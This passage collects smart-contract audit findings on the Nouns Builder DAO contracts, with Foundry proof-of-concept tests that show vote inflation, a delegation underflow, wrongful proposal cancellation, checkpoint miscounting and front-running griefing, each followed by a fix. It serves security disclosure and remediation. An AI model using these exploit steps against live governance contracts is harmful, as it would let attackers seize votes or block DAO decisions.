[Auction.sol:79](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L79) - [Governor.sol:42](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L42)  **It wasn't checked `_delay` max value (E.g. more than 1 month...):**  - [Treasury.sol:43](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L43)  ## **5. Not fully decentralized**  The `updateVotingDelay`, `updateVotingPeriod`, `updateProposalThresholdBps`, `updateQuorumThresholdBps`, `updateVetoer`, `burnVetoer` methods in the `Governor` contract have the `onlyOwner` modifier, but to be fully decentralized, these methods must verify that the address is the same as the contract himself to force a proposal to call these methods.  **Affected source code:**  - [Governor.sol:564-609](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L564-L609)  ## **6. Unsecure state order**  Negative states must be processed before positive states, otherwise, a proposal that is `Expired` or `Executed`, but is `Active` or `Pending` will be returned as `Active` or `Pending`, this makes it necessary to check that the state is correct from outside this method. I mean, changing outside the variables that alter this state in the correct way.  ```diff     function state(bytes32 _proposalId) public view returns (ProposalState) {         // Get a copy of the proposal         Proposal memory proposal = proposals[_proposalId];          // Ensure the proposal exists         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();          // If the proposal was executed:         if (proposal.executed) {             return ProposalState.Executed;              // Else if the proposal was canceled:         } else if (proposal.canceled) {             return ProposalState.Canceled;              // Else if the proposal was vetoed:         } else if (proposal.vetoed) {             return ProposalState.Vetoed;              // Else if voting has not started:         } else if (block.timestamp < proposal.voteStart) {             return ProposalState.Pending;  +           // Else if the proposal can no longer be executed: +       } else if (settings.treasury.isExpired(_proposalId)) { +           return ProposalState.Expired; -           // Else if voting has not ended: -       } else if (block.timestamp < proposal.voteEnd) { -           return ProposalState.Active;              // Else if the proposal failed (outvoted OR didn't reach quorum):         } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated;  +           // Else if voting has not ended: +       } else if (block.timestamp < proposal.voteEnd) { +           return ProposalState.Active;             // Else if the proposal has not been queued:         } else if (settings.treasury.timestamp(_proposalId) == 0) {             return ProposalState.Succeeded;  -           // Else if the proposal can no longer be executed: -       } else if (settings.treasury.isExpired(_proposalId)) { -           return ProposalState.Expired;              // Else the proposal is queued         } else {             return ProposalState.Queued;         }     } ```  **Affected source code:**  - [Governor.sol:413-456](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L413-L456)  ## **7. Timestamp dependence**  There are three main considerations when using a timestamp to execute a critical function in a contract, especially when actions involve fund transfer.  - Timestamp manipulation   - Be aware that the timestamp of the block can be manipulated by a miner - The 15-second Rule   - The [Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) (Ethereumâ€™s reference specification) does not specify a constraint on how much blocks can drift in time, but [it does specify](https://ethereum.stackexchange.com/a/5926/46821) that each timestamp should be bigger than the timestamp of its parent. Popular Ethereum protocol implementations Geth and Parity both reject blocks with timestamp more than 15 seconds in future. Therefore, a good rule of thumb in evaluating timestamp usage is: if the scale of your time-dependent event can vary by 15 seconds and maintain integrity, it is safe to use a `block.timestamp`. - Avoid using `block.number` as a timestamp   - It is possible to estimate a time delta using the `block.number` property and [average block time](https://etherscan.io/chart/blocktime), however this is not future proof as block times may change (such as [fork reorganisations](https://blog.ethereum.org/2015/08/08/chain-reorganisation-depth-expectations) and the [difficulty bomb](https://github.com/ethereum/EIPs/issues/649)). In a sale spanning days, the 15-second rule allows one to achieve a more reliable estimate of time.   See [SWC-116](https://swcregistry.io/docs/SWC-116)  **Reference:**  - https://consensys.net/blog/developers/solidity-best-practices-for-smart-contract-security/  **Affected source code:**  - [Treasury.sol:89](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L89)  ---  # Non critical  ## **8. Use `abstract` for base contracts**  `abstract` contracts are contracts that have at least one function without its implementation. **An instance of an abstract cannot be created.**  **Reference:**  - https://docs.soliditylang.org/en/v0.6.2/contracts.html#abstract-contracts  **Affected source code:**  - [TokenStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/storage/TokenStorageV1.sol#L9) - [MetadataRendererStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/storage/MetadataRendererStorageV1.sol#L9) - [ManagerStorageV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/storage/ManagerStorageV1.sol#L7) - [TreasuryTypesV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/types/TreasuryTypesV1.sol#L7) - [TreasuryStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/storage/TreasuryStorageV1.sol#L9) - [GovernorStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/storage/GovernorStorageV1.sol#L9) - [AuctionTypesV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/types/AuctionTypesV1.sol#L7) - [AuctionStorageV1.sol:10](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/storage/AuctionStorageV1.sol#L10)  ## **9. Avoid duplicate logic**  Use [Address.toBytes32](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/utils/Address.sol#L26) instead of replicate the logic.  **Affected source code:**  - [Manager.sol:123](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L123) - [Manager.sol:165](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L165)  ## **10. Avoid hardcoded values**  It is not good practice to hardcode values, but if you are dealing with addresses much less, these can change between implementations, networks or projects, so it is convenient to remove these addresses from the source code.  use selectors:  - [ERC721.sol:63-L65](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721.sol#L63-L65)  Use `immutable` with the formula, instead of the result:  - [ERC1967Upgrade.sol:21](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Upgrade.sol#L21) - [ERC1967Upgrade.sol:24](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Upgrade.sol#L24)  ## **11. Unpredictable change of owner**  The `MetadataRenderer.addProperties` method takes advantage when `ipfsData` is not defined to transfer the owner to the treasury, however this logic should be done in an initialization method and not in a configuration one, since the user does not expect this type of change when calling to this type of methods, it is convenient to adapt the logic or mention this behavior in a comment.  **Affected source code:**  - [MetadataRenderer.sol:102](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L102)  ## **12. Improve user experience**  In the `Auction._handleOutgoingTransfer` method, before throwing the `INSOLVENT` error, check if the contract has `WETH`, because maybe it's possible to send `WETH` instead of an throwing an error.  ```javascript     function _handleOutgoingTransfer(address _to, uint256 _amount) private {         // Ensure the contract has enough ETH to transfer         if (address(this).balance < _amount) revert INSOLVENT();          // Used to store if the transfer succeeded         bool success;          assembly {             // Transfer ETH to the recipient             // Limit the call to 50,000 gas             success := call(50000, _to, _amount, 0, 0, 0, 0)         }          // If the transfer failed:         if (!success) {             // Wrap as WETH             IWETH(WETH).deposit{ value: _amount }();              // Transfer WETH instead             IWETH(WETH).transfer(_to, _amount);         }     } ```  **Affected source code:**  - [Auction.sol:346](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L346)  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol#L209   # Vulnerability details  ### Impact  [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) implements a different pattern to contract upgradeability only performing an authorisation check and not ensuring that the new Manager implementation has been registered as an upgrade via `isRegisteredUpgrade()`.  The impact is that an upgrade to the [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) does not require a two step approval and be registered via `registerUpgrade()` . Additionally there is no notification event that the Manager implementation has been registered for an upgrade i.e. `UpgradeRegistered`.  In this respect the [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) contract has a different implementation to other contracts that make up the DAO (e.g. [Token.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L305) and [Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L618)) and doesnâ€™t follow the process described in the [IManager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/IManager.sol) interface, namely that upgrades are registered via `registerUpgrade()`. and therefore emit the `UpgradeRegistered` event for transparency and monitoring/auditing.  ### Proof of Concept  When comparing `_authorizeUpgrade()` in Manager.sol and Token.sol the implementations differ;  ```solidity // Manager.sol function _authorizeUpgrade(address _newImpl) internal override onlyOwner {}  // Token.sol function _authorizeUpgrade(address _newImpl) internal view override {   // Ensure the caller is the shared owner of the token and metadata renderer   if (msg.sender != owner()) revert ONLY_OWNER();    // Ensure the implementation is valid   if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl); } ```  When the Manager.sol implementation is updated it **will not** check whether a new implementation has been registered. The `upgradeTo()` function in [UUPS.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/proxy/UUPS.sol) will be called checking authorisation and then upgrading the implementation;  ```solidity // UUPS.sol function upgradeTo(address _newImpl) external onlyProxy {     _authorizeUpgrade(_newImpl);     _upgradeToAndCallUUPS(_newImpl, "", false); } ```  However unlike Token.sol, Manager.sol performs no checks as to whether the implementation has been registered only checking that the calling entity is the owner.  ### Tools Used  Vim  ### Recommended Remediation Steps  To make Manager.sol consistent with the IManager interface and other contracts in the DAO it should have the same functionality implemented in `_authoriseUpgrade()` (see below);  ```solidity function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {   if (!this.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl); } ```  As well as this the [NounsBuilderTest.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/test/utils/NounsBuilderTest.sol) should be updated to perform `.registerUpgrade()` before `.upgradeTo()`. For example;  ```solidity // L71 of NounsBuilderTest.sol vm.startPrank(zoraDAO);   manager.registerUpgrade(managerImpl0, address(managerImpl));   manager.upgradeTo(managerImpl);   vm.stopPrank(); } ```  Then all tests can be run and they will pass.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L234   # Vulnerability details   The `_createAuction` function wraps the `token.mint()` call in a try-catch block, however this will only catch reverts that comes from the require keyword and not the reverts with custom errors or other kinds of errors (arithmetic over/underflow etc.)  ## Impact In case of an error at the `mint()` function the auction won't be settled till the owner intervenes and pauses the contract.  ## Proof of Concept Here's a test that proves that `catch Error()` doesn't catch custom errors (the test will fail):  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import "forge-std/Test.sol";  contract ContractTest is Test {     function testErr() public{         Reverter r = new Reverter();         try r.throwCustomError(){          }catch Error(string memory) {          }     } }  contract Reverter{     error  MyErr();      function throwCustomError() public{         revert MyErr();     } }   ```  ## Recommended Mitigation Steps  Remove the `Error` so that it'll catch any kind of revert:  ```diff              // Pause the contract if token minting failed -        } catch Error(string memory) { +        } catch  {              _pause();          }      } ```
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268   # Vulnerability details  ## `_transferFrom()` can be used to indefinitely increase voting power. ### Impact It is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.  ### Explanation The `_transferFrom()`  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)  ### Code POC ```solidity // Insert this test case into Token.t.sol // Run: forge test --match-contract Token -vv  import "forge-std/console.sol"; ... function testIncreaseVotePower() public {         deployMock();          address voter1;         address voter2;         uint256 voter1PK;         uint256 voter2PK;          // Voter with 1 NFT voting power         voter1PK = 0xABC;         voter1 = vm.addr(voter1PK);         vm.deal(voter1, 1 ether);         // Second account created by same voter         voter2PK = 0xABD;         voter2 = vm.addr(voter2PK);    // Giving voter1 their 1 NFT         vm.prank(founder);         auction.unpause();         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(2);         vm.warp(auctionParams.duration + 1 seconds);         auction.settleCurrentAndCreateNewAuction();          // Start Exploit         console.log("Initial Votes");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));                  vm.prank(voter1);         token.delegate(voter2);         console.log("After Delegating Votes, voter1 -> delegate(voter2)");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));          vm.prank(voter1);         token.transferFrom(voter1, voter2, 2);          console.log("After Token transfer, voter1 -transferFrom()-> voter2");         console.log("voter1 votes: ", token.getVotes(voter1));         console.log("voter2 votes: ", token.getVotes(voter2));          vm.prank(voter2);         token.delegate(voter2);         console.log("After Delegating Votes, voter2 -> delegate(voter2)");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));     } ``` Expected Output: ```solidity [PASS] testVoteDoublePower() (gas: 3544946) Logs:   Initial Votes   voter1:  1   voter2:  0   After Delegating Votes, voter1 -> delegate(voter2)      voter1:  1   voter2:  1   After Token transfer, voter1 -transferFrom()-> voter2   voter1 votes:  0   voter2 votes:  2   After Delegating Votes, voter2 -> delegate(voter2)      voter1:  0   voter2:  3 ``` ### Recommendations Looking at [OpenZeppelin's ERC721Votes](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states: ``` * Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost * on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of * the votes in governance decisions, or they can delegate to themselves to be their own representative. ``` The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated. - I believe the issue is here on this [line](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268) ```solidity // Transfer 1 vote from the sender to the recipient Â  Â  Â  Â  _moveDelegateVotes(_from, _to, 1); ``` Where it should move from the delegate of `_from` to the delegate of `_to`. Suggested FIx: ```solidity Â _moveDelegateVotes(delegation[_from], delegation[_to], 1); ``` 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ## Impact Assuming an existing bug in the `_delegate` function is fixed (see my previous issue submission titled "Delegating votes leaves the token owner with votes while giving the delegate additional votes"): if a user delegates to address(0) that vote gets lost.  ## Proof of Concept  Assuming the `_delegate` function gets patched by changing: `address prevDelegate = delegation[_from];` to `address prevDelegate = delegates(_from);`  The steps to be taken:  1. User (U) gets one NFT (e.g by winning the auction)  a. votes(U) = 1 2. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 0, votes(address(0)) = 0 3. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 2^192 - 1  Below is a forge test showing the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { NounsBuilderTest } from "../utils/NounsBuilderTest.sol"; import { TokenTypesV1 } from "../../src/token/types/TokenTypesV1.sol";  contract TokenTest is NounsBuilderTest, TokenTypesV1 {     address user1 = address(0x1001);     address delegate1 = address(0x2001);     address delegate2 = address(0x2002);      function setUp() public virtual override {         super.setUp();          vm.label(user1, "user1");         vm.label(delegate1, "delegate1");         deployMock();     }      function setMockFounderParams() internal virtual override {         address[] memory wallets = new address[](1);         uint256[] memory percents = new uint256[](1);         uint256[] memory vestingEnds = new uint256[](1);          wallets[0] = founder;         percents[0] = 0;         vestingEnds[0] = 4 weeks;          setFounderParams(wallets, percents, vestingEnds);     }      function test_pown2() public {         // user1 gets one token         vm.startPrank(address(auction));         token.mint();         token.transferFrom(address(auction), user1, 0);         vm.stopPrank();          // user1 has 1 token & 1 vote         assertEq(token.balanceOf(user1), 1);         assertEq(token.getVotes(user1), 1);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), 0);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), type(uint192).max);     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Either: 1. Don't allow delegation to address(0) by adding a check or 2. If someone tries to delegate to address(0), delegate to the NFT owner instead
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L128 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L363   # Vulnerability details  ## Impact If the proposer of a proposal has votes in the same amount as the proposalThreshold, they can create a proposal. But in this case, anyone can also cancel this proposal.  When creating a proposal the requirement is "Ensure the caller's voting weight is greater than or equal to the threshold". When cancelling a proposal the check is: if `getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold` then it the cancelling is not allowed. In effect, if the number of votes is lower than *or equal* to the proposalThreshold it can be cancelled.  In the extreme case where all the DAO members have no more than the proposalThreshold amount of votes, every proposal can be cancelled.  ## Proof of Concept The forge test below demonstrates the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import "forge-std/console.sol"; import { NounsBuilderTest } from "../utils/NounsBuilderTest.sol";  import { IManager } from "../../src/manager/IManager.sol"; import { IGovernor } from "../../src/governance/governor/IGovernor.sol"; import { GovernorTypesV1 } from "../../src/governance/governor/types/GovernorTypesV1.sol";  contract GovCancelWrongCheckTest is NounsBuilderTest, GovernorTypesV1 {     uint256 internal constant AGAINST = 0;     uint256 internal constant FOR = 1;     uint256 internal constant ABSTAIN = 2;     uint256 proposalThresholdBps = 100;      address internal voter1 = address(0x1234);     address internal randomUser = address(0x8888);      function setUp() public virtual override {         super.setUp();          deployMock();     }      function testCanCancelProposalIfExactThreshold() public {         // mint a few tokens         for (uint256 i; i < 85; i++) {             vm.prank(address(auction));             token.mint();         }         assertEq(token.totalSupply(), 100);          // transfer one token to voter1         vm.prank(address(auction));         token.transferFrom(address(auction), voter1, 5);         assertEq(token.balanceOf(voter1), 1);          // make sure voter has enough votes         assertEq(governor.proposalThreshold(), 1);         assertEq(token.getVotes(voter1), 1);          vm.warp(block.timestamp + 1);          // propose         (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();         vm.prank(voter1);         bytes32 proposalId = governor.propose(targets, values, calldatas, "test");          // Proposal created successfully         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Pending));          // Cancel proposal         vm.prank(randomUser);         governor.cancel(proposalId);         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Canceled));     }      function setMockGovParams() internal virtual override {         setGovParams(2 days, 1 seconds, 1 weeks, proposalThresholdBps, 1000);     }      function mockProposal()         internal         view         returns (             address[] memory targets,             uint256[] memory values,             bytes[] memory calldatas         )     {         targets = new address[](1);         values = new uint256[](1);         calldatas = new bytes[](1);          targets[0] = address(auction);         calldatas[0] = abi.encodeWithSignature("pause()");     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Change the check in `cancel` to match the requirement in `propose`; change line 363 in Governor.sol to: `if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) >= proposal.proposalThreshold)` 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253   # Vulnerability details  Voting power for each NFT owner is persisted within timestamp-dependent checkpoints. Every voting power increase or decrease is recorded. However, the implementation of `ERC721Votes` creates separate checkpoints with the same timestamp for each interaction, even when the interactions happen in the same block/timestamp.  ## Impact  Checkpoints with the same `timestamp` will cause issues within the `ERC721Votes.getPastVotes(..)` function and will return incorrect votes for a given `_timestamp`.  ## Proof of Concept  [lib/token/ERC721Votes.sol#L252-L253](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253)  ```solidity /// @dev Records a checkpoint /// @param _account The account address /// @param _id The checkpoint id /// @param _prevTotalVotes The account's previous voting weight /// @param _newTotalVotes The account's new voting weight function _writeCheckpoint(     address _account,     uint256 _id,     uint256 _prevTotalVotes,     uint256 _newTotalVotes ) private {     // Get the pointer to store the checkpoint     Checkpoint storage checkpoint = checkpoints[_account][_id];      // Record the updated voting weight and current time     checkpoint.votes = uint192(_newTotalVotes);     checkpoint.timestamp = uint64(block.timestamp);      emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes); } ```  **Consider the following example and the votes checkpoint snapshots:**  _Note: Bob owns a smart contract used to interact with the protocol_  **Transaction 0:** Bob's smart contract receives 1 NFT through minting (1 NFT equals 1 vote)  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     |  **Transaction 1:** Bob's smart contract receives one more NFT through minting  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     |  **Transaction 1:** Within the same transaction 1, Bob's smart-contract delegates 2 votes to Alice  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     |  **Transaction 1:** Again within the same transaction 1, Bob's smart contract decides to reverse the delegation and self-delegates  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     | | 3                | 1         | 2     |  **Transaction 1:** Bob's smart contract buys one more NFT  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     | | 3                | 1         | 2     | | 4                | 2         | 3     |  Bob now wants to vote (via his smart contract) on a governance proposal that has been created on `timeCreated = 1` (timestamp 1).  Internally, the `Governor._castVote` function determines the voter's weight by calling `getVotes(_voter, proposal.timeCreated)`.  [governance/governor/Governor.sol#L275](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L275)  ```solidity weight = getVotes(_voter, proposal.timeCreated); ```  `getVotes` calls `ERC721.getPastVotes` internally:  [governance/governor/Governor.sol#L462](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462)  ```solidity function getVotes(address _account, uint256 _timestamp) public view returns (uint256) {     return settings.token.getPastVotes(_account, _timestamp); } ```  `ERC721.getPastVotes(..., 1)` tries to find the checkpoint within the `while` loop:  | # Iteration | `low` | `middle` | `high` | | ----------- | ----- | -------- | ------ | | 0           | 0     | 2        | 4      |  The `middle` checkpoint with index `2` matches the given timestamp `1` and returns `0` votes. This is incorrect, as Bob has 2 votes. Bob is not able to vote properly.  _(Please be aware that this is just one of many examples of how this issue can lead to incorrect vote accounting. In other cases, NFT owners could have more voting power than they are entitled to)_  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider batching multiple checkpoints writes per block/timestamp similar to how NounsDAO records checkpoints. 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377   # Vulnerability details  When creating a new governance proposal, the `proposalId` is generated by hashing the proposal data (`_targets, _values, _calldatas, descriptionHash`). To prevent duplicated proposals, the current `Governor` implementation checks if the `proposalId` exists already. If it exists, the call will revert with the `PROPOSAL_EXISTS` error.  ## Impact  Anyone can prevent others from creating governance proposals by front-running the create proposal transaction with the same data, followed by an immediate call to the `Governor.cancel` function.  This will prevent creating a proposal with the same proposal data. A proposal creator would have to slightly change the proposal to try to create it again (however, it can be prevented again due to the aforementioned issue)  ## Proof of Concept  [governance/governor/Governor.propose](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151)  ```solidity function propose(     address[] memory _targets,     uint256[] memory _values,     bytes[] memory _calldatas,     string memory _description ) external returns (bytes32) {     [..]      // Compute the description hash     bytes32 descriptionHash = keccak256(bytes(_description));      // Compute the proposal id     bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);      // Get the pointer to store the proposal     Proposal storage proposal = proposals[proposalId];      // Ensure the proposal doesn't already exist     if (proposal.voteStart != 0) revert PROPOSAL_EXISTS(proposalId); // @audit-info Reverts in case the proposals with the same data exists already      [..] } ```  [governance/governor/Governor.cancel](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377)  Cancelling a proposal updates the `proposal.canceled` boolean property to `true`. `proposal.voteStart` is left unchanged (`!= 0`).  ```solidity /// @notice Cancels a proposal /// @param _proposalId The proposal id function cancel(bytes32 _proposalId) external {     // Ensure the proposal hasn't been executed     if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();      // Get a copy of the proposal     Proposal memory proposal = proposals[_proposalId];      // Cannot realistically underflow and `getVotes` would revert     unchecked {         // Ensure the caller is the proposer or the proposer's voting weight has dropped below the proposal threshold         if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold)             revert INVALID_CANCEL();     }      // Update the proposal as canceled     proposals[_proposalId].canceled = true;      // If the proposal was queued:     if (settings.treasury.isQueued(_proposalId)) {         // Cancel the proposal         settings.treasury.cancel(_proposalId);     }      emit ProposalCanceled(_proposalId); } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider adding a per-account nonce storage variable (e.g. `mapping(address => uint256) internal proposalCreatorNonces;` to the `Governor` contract and include the `proposalCreatorNonces[msg.sender]++` nonce within the computed proposal id. 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/debe9b792cc70510eadf9b3728cde5b0f2ec9a1f/src/token/Token.sol#L110   # Vulnerability details  ## Impact Because of the "greedy" minting scheme for founders (tokens to founders are minted until `_isForFounder` returns `false`, i.e. until there is an unset `tokenRecipient[tokenId % 100]`), it can happen that the actual percentages of tokens that the founders receive deviate significantly from the desired percentages:  ##  Proof Of Concept Imagine we are in a situation where one founder has a 51% share and the other a 48% share. Because `schedule` is set to 1 for the first founder, `tokenRecipient[0] ... tokenRecipient[50]` will be set to his address. `tokenRecipient[51], tokenRecipient[53], ...` is set to the address of the second founder. Now let's say a mint happens just before the `vestExpiry` and when `tokenId % 100 == 0`. In such a situation, founder 1 will get 51 tokens (because of the consecutive entries in `tokenRecipients`) and founder 2 will get 1 token (because of the entry in `tokenRecipient[51]`, which is also consecutive. Let's say that the next mint happens after the vest expiration, which means that no founders get additional tokens.  In such a situation, founder 1 got 51 of the "last 100" token IDs, whereas founder 2 only got 1. Therefore, the overall percentage of tokens that those founders got will not be 51% and 40%. When the vest expiration was set to a time far in the future, it will be close to it, but when the vest timespan was only short, it can be very bad. In the extreme case where the expiration is set such that only 1 mint call causes mints for founders, founder 1 will have 51 tokens and founder 2 only 1, meaning the percentages are 51% / 1% instead of 51% / 48%!  ## Recommended Mitigation Steps Consider using another distribution scheme. Instead of the current "greedy" scheme (minting until a slot is free), it would make sense to mint the tokens for the founders every 100 tokens, i.e. everytime when `tokenId % 100 == 0`. Like that, it is ensured that the actual percentages are equal to the desired percentages.
